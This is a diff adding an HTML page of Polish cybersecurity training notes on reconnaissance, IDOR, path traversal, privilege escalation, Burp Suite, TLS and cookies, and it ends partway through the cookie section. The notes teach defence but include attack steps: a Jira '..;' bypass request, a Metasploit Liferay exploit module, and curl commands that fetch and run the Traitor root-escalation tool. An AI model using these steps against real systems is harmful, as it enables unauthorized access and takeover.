@@ -1,0 +1,3213 @@
+<!doctype html>
+<html lang="pl">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Niebezpiecznik — Notatki ze Szkolenia Cybersecurity</title>
+        <style>
+            @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap");
+
+            :root {
+                --bg: #0f1117;
+                --surface: #1a1d27;
+                --surface2: #232733;
+                --border: #2e3345;
+                --text: #e1e4ed;
+                --text-muted: #8b90a0;
+                --accent: #6c5ce7;
+                --accent-light: #a29bfe;
+                --red: #ff6b6b;
+                --orange: #ffa502;
+                --green: #2ed573;
+                --cyan: #18dcff;
+                --yellow: #ffd43b;
+                --pink: #f06595;
+                --tldr-bg: #1e2235;
+                --tldr-border: #6c5ce7;
+                --warn-bg: #2a2015;
+                --warn-border: #ffa502;
+                --code-bg: #141620;
+                --anecdote-bg: #1a2520;
+                --anecdote-border: #2ed573;
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: "Inter", sans-serif;
+                background: var(--bg);
+                color: var(--text);
+                line-height: 1.7;
+                padding: 2rem;
+                max-width: 900px;
+                margin: 0 auto;
+            }
+
+            h1 {
+                font-size: 2.2rem;
+                font-weight: 800;
+                background: linear-gradient(
+                    135deg,
+                    var(--accent-light),
+                    var(--cyan)
+                );
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                margin-bottom: 0.3rem;
+            }
+
+            .subtitle {
+                color: var(--text-muted);
+                font-size: 0.95rem;
+                margin-bottom: 2rem;
+                border-bottom: 1px solid var(--border);
+                padding-bottom: 1.5rem;
+            }
+
+            h2 {
+                font-size: 1.5rem;
+                font-weight: 700;
+                color: var(--accent-light);
+                margin: 2.5rem 0 1rem;
+                display: flex;
+                align-items: center;
+                gap: 0.5rem;
+            }
+
+            h2 .emoji {
+                font-size: 1.3rem;
+            }
+
+            h3 {
+                font-size: 1.15rem;
+                font-weight: 600;
+                color: var(--cyan);
+                margin: 1.5rem 0 0.5rem;
+            }
+
+            p {
+                margin-bottom: 0.8rem;
+            }
+
+            .section {
+                background: var(--surface);
+                border: 1px solid var(--border);
+                border-radius: 12px;
+                padding: 1.5rem;
+                margin-bottom: 1.5rem;
+            }
+
+            .section-title {
+                font-size: 1.25rem;
+                font-weight: 700;
+                color: var(--text);
+                margin-bottom: 1rem;
+                display: flex;
+                align-items: center;
+                gap: 0.5rem;
+            }
+
+            /* TL;DR boxes */
+            .tldr {
+                background: var(--tldr-bg);
+                border-left: 4px solid var(--tldr-border);
+                border-radius: 0 8px 8px 0;
+                padding: 1rem 1.2rem;
+                margin-bottom: 1rem;
+            }
+
+            .tldr-label {
+                font-size: 0.75rem;
+                font-weight: 700;
+                text-transform: uppercase;
+                letter-spacing: 0.1em;
+                color: var(--accent-light);
+                margin-bottom: 0.3rem;
+            }
+
+            .tldr p {
+                margin-bottom: 0.3rem;
+                font-size: 0.95rem;
+            }
+
+            /* Warning/correction boxes */
+            .warn {
+                background: var(--warn-bg);
+                border-left: 4px solid var(--warn-border);
+                border-radius: 0 8px 8px 0;
+                padding: 1rem 1.2rem;
+                margin-bottom: 1rem;
+            }
+
+            .warn-label {
+                font-size: 0.75rem;
+                font-weight: 700;
+                text-transform: uppercase;
+                letter-spacing: 0.1em;
+                color: var(--orange);
+                margin-bottom: 0.3rem;
+            }
+
+            /* Anecdote/example boxes */
+            .anecdote {
+                background: var(--anecdote-bg);
+                border-left: 4px solid var(--anecdote-border);
+                border-radius: 0 8px 8px 0;
+                padding: 1rem 1.2rem;
+                margin-bottom: 1rem;
+            }
+
+            .anecdote-label {
+                font-size: 0.75rem;
+                font-weight: 700;
+                text-transform: uppercase;
+                letter-spacing: 0.1em;
+                color: var(--green);
+                margin-bottom: 0.3rem;
+            }
+
+            /* Expandable details */
+            details {
+                background: var(--surface2);
+                border: 1px solid var(--border);
+                border-radius: 8px;
+                margin-bottom: 0.8rem;
+                overflow: hidden;
+            }
+
+            summary {
+                padding: 0.8rem 1.2rem;
+                cursor: pointer;
+                font-weight: 600;
+                color: var(--accent-light);
+                user-select: none;
+                list-style: none;
+                display: flex;
+                align-items: center;
+                gap: 0.5rem;
+            }
+
+            summary::-webkit-details-marker {
+                display: none;
+            }
+
+            summary::before {
+                content: "▶";
+                font-size: 0.7rem;
+                transition: transform 0.2s;
+                color: var(--text-muted);
+            }
+
+            details[open] summary::before {
+                transform: rotate(90deg);
+            }
+
+            details .content {
+                padding: 0 1.2rem 1rem;
+                border-top: 1px solid var(--border);
+            }
+
+            /* Code blocks */
+            pre {
+                background: var(--code-bg);
+                border: 1px solid var(--border);
+                border-radius: 8px;
+                padding: 1rem;
+                overflow-x: auto;
+                margin: 0.8rem 0;
+                font-size: 0.85rem;
+                line-height: 1.5;
+            }
+
+            code {
+                font-family: "JetBrains Mono", monospace;
+                font-size: 0.85rem;
+            }
+
+            pre code {
+                color: var(--cyan);
+            }
+
+            :not(pre) > code {
+                background: var(--surface2);
+                padding: 0.15rem 0.4rem;
+                border-radius: 4px;
+                color: var(--pink);
+                font-size: 0.85em;
+            }
+
+            /* Tags */
+            .tag {
+                display: inline-block;
+                padding: 0.15rem 0.5rem;
+                border-radius: 4px;
+                font-size: 0.75rem;
+                font-weight: 600;
+                margin: 0.1rem 0.2rem;
+            }
+            .tag-tool {
+                background: #2d2054;
+                color: var(--accent-light);
+            }
+            .tag-web {
+                background: #1a3040;
+                color: var(--cyan);
+            }
+            .tag-vuln {
+                background: #3a1a1a;
+                color: var(--red);
+            }
+            .tag-tip {
+                background: #1a3020;
+                color: var(--green);
+            }
+
+            /* Table of contents */
+            .toc {
+                background: var(--surface);
+                border: 1px solid var(--border);
+                border-radius: 12px;
+                padding: 1.5rem;
+                margin-bottom: 2rem;
+            }
+            .toc-title {
+                font-weight: 700;
+                color: var(--accent-light);
+                margin-bottom: 0.8rem;
+                font-size: 1.1rem;
+            }
+            .toc a {
+                color: var(--text-muted);
+                text-decoration: none;
+                display: block;
+                padding: 0.25rem 0;
+                font-size: 0.9rem;
+                transition: color 0.2s;
+            }
+            .toc a:hover {
+                color: var(--accent-light);
+            }
+            .toc ol {
+                padding-left: 1.2rem;
+            }
+            .toc li {
+                margin-bottom: 0.15rem;
+            }
+
+            /* Quick reference table */
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin: 1rem 0;
+                font-size: 0.9rem;
+            }
+            th {
+                background: var(--surface2);
+                color: var(--accent-light);
+                padding: 0.7rem;
+                text-align: left;
+                font-weight: 600;
+                border: 1px solid var(--border);
+            }
+            td {
+                padding: 0.7rem;
+                border: 1px solid var(--border);
+                vertical-align: top;
+            }
+
+            .key-term {
+                color: var(--yellow);
+                font-weight: 600;
+            }
+
+            a {
+                color: var(--cyan);
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+
+            .divider {
+                border: none;
+                border-top: 1px solid var(--border);
+                margin: 2rem 0;
+            }
+
+            /* Reference section highlight */
+            .ref-section {
+                background: linear-gradient(
+                    135deg,
+                    var(--surface),
+                    var(--surface2)
+                );
+                border: 2px solid var(--accent);
+                border-radius: 12px;
+                padding: 1.5rem;
+                margin-bottom: 1.5rem;
+            }
+
+            .ref-section h3 {
+                color: var(--accent-light);
+                margin-top: 0;
+            }
+
+            ul {
+                padding-left: 1.3rem;
+                margin-bottom: 0.8rem;
+            }
+            li {
+                margin-bottom: 0.3rem;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>Niebezpiecznik — Notatki ze Szkolenia</h1>
+        <p class="subtitle">
+            Szkolenie z cyberbezpieczenstwa | Notatki zorganizowane,
+            zweryfikowane i uzupelnione o brakujace informacje
+        </p>
+
+        <nav class="toc">
+            <div class="toc-title">Spis tresci</div>
+            <ol>
+                <li><a href="#recon">Rekonesans — Zbieranie informacji</a></li>
+                <li>
+                    <a href="#idor">IDOR — Insecure Direct Object Reference</a>
+                </li>
+                <li>
+                    <a href="#path-traversal"
+                        >Path Traversal — Omijanie zabezpieczen</a
+                    >
+                </li>
+                <li>
+                    <a href="#privesc"
+                        >Privilege Escalation — Eskalacja uprawnien</a
+                    >
+                </li>
+                <li>
+                    <a href="#endpoints"
+                        >Endpointy — Odkrywanie ukrytych zasobow</a
+                    >
+                </li>
+                <li><a href="#burp">Burp Suite — Przechwytywanie ruchu</a></li>
+                <li><a href="#tls">TLS i Certyfikaty</a></li>
+                <li><a href="#cookies">Cookies i RODO</a></li>
+                <li><a href="#git">.git — Wyciek kodu zrodlowego</a></li>
+                <li><a href="#jwt">JWT — JSON Web Token</a></li>
+                <li>
+                    <a href="#headers"
+                        >Naglowki HTTP — CF-Connecting-IP i spoofing</a
+                    >
+                </li>
+                <li><a href="#csrf">CSRF — Cross-Site Request Forgery</a></li>
+                <li><a href="#crypto">Cryptographic Failures i TLS</a></li>
+                <li>
+                    <a href="#dns"
+                        >DNS — Domain Squatting i Certificate Transparency</a
+                    >
+                </li>
+                <li><a href="#iot">IoT, Smart Devices i Zero-day</a></li>
+                <li>
+                    <a href="#injection"
+                        >Injection i XSS — Wstrzykiwanie kodu</a
+                    >
+                </li>
+                <li>
+                    <a href="#reference"
+                        >Szybka referencja — Narzedzia i strony</a
+                    >
+                </li>
+            </ol>
+        </nav>
+
+        <!-- ============================================ -->
+        <!-- SECTION 1: REKONESANS -->
+        <!-- ============================================ -->
+        <h2 id="recon">
+            <span class="emoji">🔍</span> 1. Rekonesans — Zbieranie informacji
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Atakujacy zaczynaja od szukania publicznie dostepnych
+                    informacji o serwerze. Najczesciej uzywaja Google Dorkow i
+                    otwartych indeksow katalogow. Jesli serwer ma wlaczony
+                    directory listing — to tak jakby zostawic otwarte drzwi.
+                </p>
+            </div>
+
+            <h3>Index of / (Directory Listing)</h3>
+            <p>
+                Serwery webowe (Apache, Nginx) domyslnie moga tworzyc
+                <span class="key-term">index katalogow</span> — strone z lista
+                plikow, jak w FTP. Czesto wlaczane nieswiadomie.
+            </p>
+
+            <details>
+                <summary>Jak to dziala i dlaczego to problem?</summary>
+                <div class="content">
+                    <p>
+                        Kiedy serwer nie znajduje pliku
+                        <code>index.html</code> / <code>index.php</code> w
+                        katalogu, generuje automatyczna liste plikow. Atakujacy
+                        moze wtedy przegladac pliki — w tym backupy,
+                        konfiguracje, logi.
+                    </p>
+                    <p><strong>Jak wylaczyc:</strong></p>
+                    <pre><code># Apache — .htaccess
+Options -Indexes
+
+# Nginx — nginx.conf
+autoindex off;</code></pre>
+                    <p>
+                        Sprawdz sam: wpisz w Google
+                        <code>intitle:"Index of /"</code> i zobaczysz tysiace
+                        otwartych katalogow.
+                    </p>
+                </div>
+            </details>
+
+            <h3>Google Hacking (Google Dorking)</h3>
+            <p>
+                Google indeksuje wszystko, co mu pokaza serwery — w tym pliki,
+                ktore nie powinny byc publicznie dostepne. Uzywamy specjalnych
+                operatorow wyszukiwania:
+            </p>
+
+            <details>
+                <summary>Operatory Google Hacking</summary>
+                <div class="content">
+                    <p>
+                        <code class="key-term">intitle:</code> — szuka w tytule
+                        strony
+                    </p>
+                    <pre><code>intitle:"index" backup sql</code></pre>
+                    <p>
+                        Szuka stron z "index" w tytule, zawierajacych slowa
+                        "backup" i "sql". Znajduje kopie zapasowe baz danych!
+                    </p>
+
+                    <p>
+                        <code class="key-term">inurl:</code> — szuka w adresie
+                        URL
+                    </p>
+                    <pre><code>inurl:home?p_p_id</code></pre>
+                    <p>
+                        Szuka parametru typowego dla Liferay Portal — platformy
+                        CMS czesto uzywanej przez rzady i korporacje.
+                    </p>
+
+                    <pre><code>/api/jsonws</code></pre>
+                    <p>
+                        Jesli ta sciezka zwraca <code>forbidden</code> (403) lub
+                        <code>not found</code> (404) — oznacza ze API istnieje.
+                        Jesli zwroci <code>200</code> — masz dostep do
+                        dokumentacji API.
+                    </p>
+
+                    <div class="warn">
+                        <div class="warn-label">Wazne — dzialaj!</div>
+                        <p>
+                            Po konfiguracji serwera:
+                            <strong
+                                >SPRAWDZ CZY INDEKSOWANIE SERWERA JEST
+                                WYLACZONE!</strong
+                            >
+                        </p>
+                    </div>
+                </div>
+            </details>
+
+            <div class="anecdote">
+                <div class="anecdote-label">
+                    Narzedzia wspomniane na szkoleniu
+                </div>
+                <p>
+                    <span class="tag tag-tool">Metasploit</span> — framework do
+                    znajdowania i uruchamiania exploitow. Uzywany do testow
+                    penetracyjnych.
+                </p>
+                <p>
+                    <span class="tag tag-tool">Liferay</span> — platforma CMS /
+                    portal, czesto cel atakow (powiazanie z
+                    <code>inurl:</code> dorkami powyzej).
+                </p>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 2: IDOR -->
+        <!-- ============================================ -->
+        <h2 id="idor">
+            <span class="emoji">🪪</span> 2. IDOR — Insecure Direct Object
+            Reference
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    IDOR to sytuacja, w ktorej zmiana liczby w URL-u (np.
+                    <code>id=123</code> na <code>id=124</code>) pozwala zobaczyc
+                    dane kogoś innego. Brak kontroli dostepu = katastrofa.
+                </p>
+            </div>
+
+            <div class="anecdote">
+                <div class="anecdote-label">
+                    Przyklad ze szkolenia — strona rzadowa z paszportami
+                </div>
+                <p>
+                    Na szkoleniu omowiono przypadek podatnosci w
+                    <strong>stronie rzadowej opartej na Liferay</strong>, gdzie
+                    uzytkownicy mogli ogladac wnioski paszportowe innych osob.
+                    URL mial postac:
+                </p>
+                <pre><code>/index?xFormsAppName=wniosek_paszportowy&id=100000123</code></pre>
+                <p>
+                    Zmiana parametru <code>id</code> na losowa wartosc (np.
+                    <code>100000124</code>) pokazywala cudzy wniosek! Brak
+                    weryfikacji, czy uzytkownik ma prawo widziec dany rekord.
+                </p>
+            </div>
+
+            <details>
+                <summary>
+                    Jak poprawnie zabezpieczyc aplikacje przed IDOR?
+                </summary>
+                <div class="content">
+                    <p>Zasady bezpieczenstwa IDOR:</p>
+                    <ul>
+                        <li>
+                            <strong>Zawsze sprawdzaj uprawnienia</strong> — sam
+                            fakt posiadania ID nie oznacza prawa dostepu
+                        </li>
+                        <li>
+                            <strong
+                                >Uzywaj UUID zamiast sekwencyjnych ID</strong
+                            >
+                            — np.
+                            <code>550e8400-e29b-41d4-a716-446655440000</code>
+                            zamiast <code>123</code>. UUID sa trudniejsze do
+                            zgadniecia, ale
+                            <strong
+                                >nie sa wystarczajacym zabezpieczeniem same w
+                                sobie!</strong
+                            >
+                        </li>
+                        <li>
+                            <strong>Zwracaj 403 (Forbidden)</strong> jesli
+                            uzytkownik nie ma dostepu do zasobu
+                        </li>
+                        <li>
+                            <strong>Pamietaj</strong>: UUID utrudnia zgadywanie,
+                            ale
+                            <strong
+                                >prawdziwe zabezpieczenie to kontrola dostepu po
+                                stronie serwera</strong
+                            >
+                        </li>
+                    </ul>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 3: PATH TRAVERSAL -->
+        <!-- ============================================ -->
+        <h2 id="path-traversal">
+            <span class="emoji">🛤️</span> 3. Path Traversal — Omijanie
+            zabezpieczen
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Srednik (<code>;</code>) w URL jest ignorowany przez Nginx,
+                    ale Tomcat traktuje go jako separator parametrow sciezki.
+                    Atakujacy dodaje <code>..;</code> w URL, zeby ominac reverse
+                    proxy i dostac sie do chronionych zasobow.
+                </p>
+            </div>
+
+            <h3>Jira + Tomcat + Nginx — klasyka</h3>
+            <p>
+                Scenariusz: Jira (na Tomcat) stoi za VPN i Nginx. Nginx
+                przekazuje ruch do Tomcata, ale filtruje sciezki.
+            </p>
+
+            <details>
+                <summary>Jak dziala atak z ..;?</summary>
+                <div class="content">
+                    <p>
+                        <strong>Problem:</strong> Nginx i Tomcat roznia sie
+                        interpretacja srednika w URL:
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Nginx</strong>: <code>..;</code> to zwykly
+                            tekst, nie traversal
+                        </li>
+                        <li>
+                            <strong>Tomcat</strong>: <code>..;</code> to to samo
+                            co <code>..</code> (srednik jest separatorem
+                            parametrow sciezki w specyfikacji Java Servlet)
+                        </li>
+                        <li>
+                            <strong>Linux</strong>: kropka-kropka
+                            (<code>..</code>) to folder nadrzedny. Srednik to
+                            jest "domyslnie folder kropka-kropka" (jak zapisano
+                            w notatkach — chodzilo o to, ze Tomcat normalizuje
+                            <code>..;</code> do <code>..</code>)
+                        </li>
+                    </ul>
+
+                    <p><strong>Atak:</strong></p>
+                    <pre><code># Nginx przepuszcza ten URL (nie widzi traversal):
+GET /apiurl/status/..;/secure/dashboard.jspa
+
+# Tomcat normalizuje do:
+GET /apiurl/secure/dashboard.jspa
+
+# Efekt: dostep do chronionych zasobow Jira!</code></pre>
+
+                    <p>
+                        Ten typ ataku jest znany jako
+                        <span class="key-term"
+                            >Path Normalization Inconsistency</span
+                        >. Zaprezentowany na
+                        <strong>Black Hat 2018</strong> przez Orange Tsai.
+                    </p>
+                </div>
+            </details>
+
+            <div class="anecdote">
+                <div class="anecdote-label">Exploit z Metasploit</div>
+                <p>Na szkoleniu pokazano modul Metasploit:</p>
+                <pre><code># W msfconsole:
+use exploit/multi/http/liferay_java_unmarshalling
+# Exploituje Java deserialization w Liferay Portal
+# Dotyczy CVE-2020-7961</code></pre>
+                <p>
+                    Modul
+                    <code>exploit/multi/http/liferay_java_unmarshalling</code>
+                    wykorzystuje podatnosc deserializacji Java w Liferay Portal
+                    przez JSONWS API.
+                </p>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 4: PRIVILEGE ESCALATION -->
+        <!-- ============================================ -->
+        <h2 id="privesc">
+            <span class="emoji">⬆️</span> 4. Privilege Escalation — Eskalacja
+            uprawnien
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Po uzyskaniu dostepu do shella (np. przez exploit) — kolejny
+                    krok to zdobycie uprawnien roota. Narzedzie
+                    <strong>Traitor</strong> automatycznie skanuje system pod
+                    katem znanych podatnosci i przetestuje je.
+                </p>
+            </div>
+
+            <details>
+                <summary>Narzedzie: Traitor — jak dziala?</summary>
+                <div class="content">
+                    <p>
+                        <strong>Traitor</strong> to narzedzie napisane w Go,
+                        ktore automatycznie wyszukuje podatnosci pozwalajace na
+                        eskalacje uprawnien w systemach Linux:
+                    </p>
+                    <ul>
+                        <li>
+                            Sprawdza metody z <strong>GTFOBins</strong> (binaria
+                            z SUID, sudo itp.)
+                        </li>
+                        <li>
+                            Testuje <strong>CVE-2022-0847</strong> (DirtyPipe)
+                        </li>
+                        <li>
+                            Testuje <strong>CVE-2021-4034</strong> (PwnKit —
+                            polkit)
+                        </li>
+                        <li>
+                            Sprawdza zapisywalny <strong>docker.sock</strong>
+                        </li>
+                    </ul>
+                    <pre><code># Pobranie i uruchomienie Traitor:
+curl -sL https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 \
+  -o traitor
+chmod +x traitor
+
+# Skanowanie systemu pod katem podatnosci:
+./traitor
+
+# Automatyczna proba eksploitacji (jesli cos znajdzie):
+./traitor -a</code></pre>
+                    <p>
+                        Jak zapisano w notatkach: "Mozemy ja zainstalowac i
+                        dostac sie do roota" — Traitor automatycznie szuka
+                        "low-hanging fruit" i moze eskalowac uprawnienia do
+                        roota bez manualnej pracy.
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 5: ENDPOINT DISCOVERY -->
+        <!-- ============================================ -->
+        <h2 id="endpoints">
+            <span class="emoji">🗺️</span> 5. Endpointy — Odkrywanie ukrytych
+            zasobow
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    "W duzej czesci podstawa ataku na aplikacje to
+                    <strong>ZNAJOMOSC ENDPOINTOW</strong>" — cytat ze szkolenia.
+                    Jesli nie wiesz jakie sciezki ma aplikacja, nie wiesz co
+                    atakowac. DirBuster i Burp Suite pomagaja to odkryc.
+                </p>
+            </div>
+
+            <h3>DirBuster</h3>
+            <p>
+                Narzedzie stworzone przez <strong>OWASP</strong>.
+                Brute-force'uje sciezki na serwerze uzywajac slownikow:
+            </p>
+
+            <details>
+                <summary>Jak korzystac z DirBuster?</summary>
+                <div class="content">
+                    <p>
+                        DirBuster wysyla tysiace zapytan do serwera, probujac
+                        rozne sciezki z listy slow:
+                    </p>
+                    <pre><code># Typowe slowniki (dostepne na Kali Linux):
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Standardowe sciezki na systemach Unix:
+/usr/  — Universal System Resources
+/etc/  — Everything To Configure
+# Te prefiksy sa czesto uzywane w URL-ach API</code></pre>
+                    <p>Odpowiedzi serwera mowia nam co istnieje:</p>
+                    <ul>
+                        <li>
+                            <code>200</code> — zasob istnieje i jest dostepny
+                        </li>
+                        <li>
+                            <code>403</code> — zasob istnieje, ale jest
+                            chroniony (warto zanotowac!)
+                        </li>
+                        <li><code>404</code> — nie istnieje</li>
+                    </ul>
+                </div>
+            </details>
+
+            <h3>Zgadywanie parametrow API</h3>
+            <div class="anecdote">
+                <div class="anecdote-label">Demo ze szkolenia — api.php</div>
+                <p>
+                    Prowadzacy pokazal przyklad na
+                    <code>demo.kuba-orlik.name</code>:
+                </p>
+                <pre><code># Krok 1: Wejscie na API
+GET /api.php
+# Odpowiedz: "Missing method (e.g. get_users)"
+
+# Krok 2: Dodanie metody
+GET /api.php?method=get_users
+# Odpowiedz: "Missing PIN — The 'pin' query parameter is required"
+
+# Krok 3: Brute-force PIN (np. 0-99) w Burp Suite Intruder
+GET /api.php?method=get_users&pin=§01§
+# Payload type: Numbers, range 0-99</code></pre>
+                <p>
+                    API samo podpowiadalo atakujacemu co potrzebuje — to
+                    klasyczny blad zbyt gadatliwych komunikatow o bledach.
+                </p>
+            </div>
+
+            <details>
+                <summary>HTTP — wazna uwaga o GET i body</summary>
+                <div class="content">
+                    <p>
+                        W notatkach zapisano: "HTTP: (dwie nowe linie w GET to
+                        body)". To odnosi sie do struktury zapytania HTTP:
+                    </p>
+                    <pre><code>GET /api.php?method=get_users HTTP/1.1    ← linia zapytania
+Host: demo.kuba-orlik.name                ← naglowki
+                                          ← pusta linia (dwie nowe linie)
+                                          ← tu zaczyna sie body (w GET zwykle puste)</code></pre>
+                    <p>
+                        Dwie nowe linie (<code>\r\n\r\n</code>) oddzielaja
+                        naglowki od ciala zapytania. W GET body jest zwykle
+                        puste, ale technicznie moze istniec.
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 6: BURP SUITE -->
+        <!-- ============================================ -->
+        <h2 id="burp">
+            <span class="emoji">🔧</span> 6. Burp Suite — Przechwytywanie ruchu
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Burp Suite to proxy <strong>man-in-the-middle</strong> —
+                    staje pomiedzy Twoja przegladarka a serwerem i pozwala
+                    ogladac, modyfikowac i powtarzac kazde zapytanie HTTP/HTTPS.
+                </p>
+            </div>
+
+            <details>
+                <summary>Jak dziala Burp jako proxy?</summary>
+                <div class="content">
+                    <p>Burp tworzy <strong>dwie sesje TLS</strong>:</p>
+                    <ol>
+                        <li>
+                            <strong>Klient ↔ Burp</strong>: przegladarka
+                            nawiazuje polaczenie TLS z Burp (ufa mu, bo masz
+                            zainstalowany certyfikat CA Burpa)
+                        </li>
+                        <li>
+                            <strong>Burp ↔ Serwer</strong>: Burp nawiazuje
+                            osobne polaczenie TLS z serwerem docelowym
+                        </li>
+                    </ol>
+                    <p>
+                        Dzieki temu Burp widzi caly ruch w postaci jawnej — moze
+                        go czytac, modyfikowac, powtarzac.
+                    </p>
+
+                    <h3>Certificate Authority (CA)</h3>
+                    <p>
+                        Burp generuje wlasny
+                        <span class="key-term">certyfikat CA</span>. Instalujesz
+                        go w przegladarce/systemie, dzieki czemu przegladarka
+                        "ufa" certyfikatom generowanym przez Burp. Bez tego
+                        zobaczysz bledy SSL.
+                    </p>
+
+                    <p>
+                        <strong>Wazne:</strong> Burp moze tez na tez odslaniac
+                        ruch w przegladarce — jak zapisano w notatkach "zobacz
+                        niebezpiecznik.pl" — prowadzacy prawdopodobnie pokazal
+                        przechwytywanie ruchu na zywo.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>Przechwytywanie ruchu na mobilkach</summary>
+                <div class="content">
+                    <p>
+                        Do przechwytywania ruchu z aplikacji mobilnych na
+                        szkoleniu wspomniano o <strong>HTTP Toolkit</strong>:
+                    </p>
+                    <ul>
+                        <li>Dziala od razu z terminala</li>
+                        <li>
+                            Na Androidzie: podlaczasz przez
+                            <strong>ADB</strong> (Android Debug Bridge)
+                        </li>
+                        <li>
+                            Nie wymaga rootowania telefonu (w wielu przypadkach)
+                        </li>
+                        <li>
+                            Wywal USB debugging: <code>adb devices</code> →
+                            polacz → toolkit przechwytuje ruch
+                        </li>
+                    </ul>
+                    <pre><code># Instalacja HTTP Toolkit:
+# Dostepny na https://httptoolkit.com/
+# Na Linux:
+sudo apt install httptoolkit
+
+# Polaczenie z Android przez ADB:
+adb devices          # lista podlaczonych urzadzen
+adb reverse tcp:8000 tcp:8000  # przekierowanie portu</code></pre>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 7: TLS I CERTYFIKATY -->
+        <!-- ============================================ -->
+        <h2 id="tls"><span class="emoji">🔒</span> 7. TLS i Certyfikaty</h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    TLS szyfruje polaczenie miedzy przegladarka a serwerem.
+                    Certyfikat potwierdza tozsamosc serwera. Jesli certyfikat
+                    jest podpisany przez zaufana
+                    <strong>Certificate Authority (CA)</strong> — przegladarka
+                    mu ufa.
+                </p>
+            </div>
+
+            <details>
+                <summary>Jak dzialaja certyfikaty — model zaufania</summary>
+                <div class="content">
+                    <p>Lancuch zaufania:</p>
+                    <ol>
+                        <li>
+                            <strong>Root CA</strong> — "zrodlo prawdy",
+                            wbudowane w system/przegladarke
+                        </li>
+                        <li>
+                            <strong>Intermediate CA</strong> — posrednia
+                            instytucja certyfikujaca
+                        </li>
+                        <li>
+                            <strong>Certyfikat serwera</strong> — podpisany
+                            przez intermediate CA, identyfikuje konkretna domene
+                        </li>
+                    </ol>
+                    <p>
+                        Przegladarka sprawdza caly lancuch — jesli ktorykolwiek
+                        element jest niezaufany, wyswietla ostrzezenie.
+                    </p>
+                    <p>
+                        Jak zapisano w notatkach: "podpis certyfikatu
+                        potwierdzony — tez podmiot" — certyfikat musi byc
+                        podpisany przez zaufany CA i wystawiony dla wlasciwego
+                        podmiotu (domeny).
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 8: COOKIES -->
+        <!-- ============================================ -->
+        <h2 id="cookies"><span class="emoji">🍪</span> 8. Cookies i RODO</h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Banner akceptacji ciasteczek to nie tylko formalnosc — musi
+                    informowac o <strong>celu</strong> zbierania danych.
+                    Narzedzie <strong>Rentgen</strong> skanuje strony i zglasza
+                    naruszenia RODO.
+                </p>
+            </div>
+
+            <h3>Typy ciasteczek</h3>
+            <details>
+                <summary>
+                    Session, Persistent, Third-party — co jest czym?
+                </summary>
+                <div class="content">
+                    <ul>
+                        <li>
+                            <strong>Session cookies</strong> — istnieja tylko do
+                            zamkniecia przegladarki. Typowe dla sesji logowania.
+                            Brak atrybutu <code>Expires</code> /
+                            <code>Max-Age</code>.
+                        </li>
+                        <li>
+                            <strong>Persistent cookies</strong> — maja date
+                            wygasniecia, przetrwaja restart przegladarki.
+                            Uzywane np. do "zapamietaj mnie".
+                        </li>
+                        <li>
+                            <strong>Third-party cookies</strong> — ustawiane
+                            przez <em>inna domene</em> niz ta, ktora odwiedzasz
+                            (np. tracker reklamowy z
+                            <code>ads.facebook.com</code> na stronie sklepu). To
+                            one sa glownym celem RODO. Przegladarki coraz
+                            bardziej je blokuja (Firefox domyslnie, Chrome
+                            wycofuje sie z planow).
+                        </li>
+                        <li>
+                            <strong>First-party cookies</strong> — ustawiane
+                            przez domene, ktora odwiedzasz. Mniej
+                            kontrowersyjne, ale tez podlegaja RODO.
+                        </li>
+                    </ul>
+                </div>
+            </details>
+
+            <h3>Atrybuty bezpieczenstwa cookies</h3>
+            <details>
+                <summary>
+                    Secure, HttpOnly, SameSite, Domain, Path — scigawka
+                </summary>
+                <div class="content">
+                    <pre><code>Set-Cookie: session=abc123;
+  Secure;        // wysylane TYLKO po HTTPS
+  HttpOnly;      // niedostepne z JS (document.cookie)
+  SameSite=Lax;  // ochrona przed CSRF (patrz sekcja 12)
+  Domain=.example.com;  // dostepne dla subdomen
+  Path=/app;     // dostepne tylko pod /app/*
+  Max-Age=3600;  // wygasa po 1 godzinie</code></pre>
+                    <p><strong>Najwazniejsze dla bezpieczenstwa:</strong></p>
+                    <ul>
+                        <li>
+                            <code>HttpOnly</code> — nawet jesli atakujacy
+                            uruchomi XSS,
+                            <strong>nie ukradnie ciasteczka sesji</strong> przez
+                            <code>document.cookie</code>
+                        </li>
+                        <li>
+                            <code>Secure</code> — zapobiega wyslaniu cookie
+                            przez nieszyfrowane HTTP (ochrona przed MITM)
+                        </li>
